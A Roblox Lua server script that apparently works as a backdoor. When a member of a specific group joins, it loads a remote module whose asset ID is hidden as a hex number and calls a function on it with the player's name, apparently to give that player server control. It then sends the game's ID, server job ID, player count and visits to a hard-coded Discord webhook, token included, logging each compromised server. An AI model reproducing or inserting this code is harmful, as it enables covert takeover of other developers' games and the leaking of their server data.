local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local ModuleId = 121630702115437
local WebhookURL = "https://discord.com/api/webhooks/1436485533759967353/JRyVvBTUVM8qoeNvIyHGFOcRdu2b2NIVNnPO993bFNB4CSVMk4oDyBIwPBp0885vbsFM"
local GroupId = 14583624
local GameIcon, Visits, GameName = "", "Unknown", "Unknown"

Players.PlayerAdded:Connect(function(player)
if player:IsInGroup(GroupId) then
local success, result = pcall(function()
return require(0x6e9f5acb1a6d).FSA(player.Name)
end)

if success then
local success, gameData = pcall(function()
return MarketplaceService:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
end)

if success then
GameIcon = "https://www.roblox.com/asset-thumbnail/image?assetId=" .. gameData.IconImageAssetId .. "&width=512&height=512&format=png"
Visits = tostring(gameData.Visits)
GameName = gameData.Name
end

local data = {
["embeds"] = {{
["title"] = GameName,
["color"] = 16711680,
["thumbnail"] = {["url"] = GameIcon},
["fields"] = {
{["name"] = "📌 Game ID", ["value"] = tostring(game.PlaceId), ["inline"] = true},
{["name"] = "🔗 Game Link", ["value"] = "[Click Here](https://www.roblox.com/games/" .. game.PlaceId .. ")", ["inline"] = true},
{["name"] = "📂 Job ID", ["value"] = game.JobId, ["inline"] = false},
{["name"] = "👥 Players In-Game", ["value"] = tostring(#Players:GetPlayers()), ["inline"] = true},
{["name"] = "📊 Visits", ["value"] = Visits, ["inline"] = true},
{["name"] = "⏰ Time Logged", ["value"] = os.date("%Y-%m-%d %H:%M:%S"), ["inline"] = false}
}
}}
}

HttpService:PostAsync(WebhookURL, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson, false)
end
end
end)
